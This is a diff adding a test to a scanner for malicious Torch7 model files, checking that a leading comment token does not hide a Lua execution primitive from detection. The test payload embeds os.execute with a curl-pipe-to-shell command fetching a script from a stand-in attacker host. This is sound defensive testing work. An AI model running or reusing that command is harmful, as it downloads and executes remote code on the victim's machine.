@@ -44,6 +44,22 @@ def test_scan_detects_lua_execution_with_network_context(tmp_path: Path) -> None
     assert execution_findings[0].severity == IssueSeverity.CRITICAL
 
 
+def test_scan_comment_token_does_not_suppress_lua_execution_detection(tmp_path: Path) -> None:
+    payload = (
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('# curl https://evil.example/payload.sh | sh')\n"
+    )
+    path = _write_torch7_file(tmp_path, payload, filename="malicious-comment.t7")
+
+    result = Torch7Scanner().scan(str(path))
+    execution_findings = [
+        check
+        for check in result.checks
+        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+    ]
+    assert len(execution_findings) == 1
+    assert execution_findings[0].severity == IssueSeverity.CRITICAL
+
+
 def test_scan_handles_corrupt_file_gracefully(tmp_path: Path) -> None:
     path = _write_torch7_file(tmp_path, b"NOT7", filename="corrupt.t7")
 
